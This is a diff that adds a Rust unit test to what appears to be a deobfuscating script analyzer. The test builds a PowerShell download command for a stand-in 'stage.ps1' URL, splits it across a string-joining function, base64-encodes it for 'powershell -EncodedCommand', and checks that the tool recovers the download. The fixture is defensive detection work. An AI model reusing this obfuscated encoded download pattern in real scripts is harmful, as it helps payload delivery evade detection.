@@ -15993,6 +15993,35 @@ Join-Text 'Invoke-WebRequest -Uri https://ps-concat-extractor' '.example/stage.p
     }
 
     #[test]
+    fn ps1_literal_multi_concat_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-multi-concat-extractor.example/stage.ps1";
+        let inner = r#"function Join-Text($left,$middle,$right) {
+  return $left + $middle + $right
+}
+Join-Text 'Invoke-WebRequest -Uri https://ps-multi' '-concat-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "multi-part literal concatenator extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_constant_split_operator_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
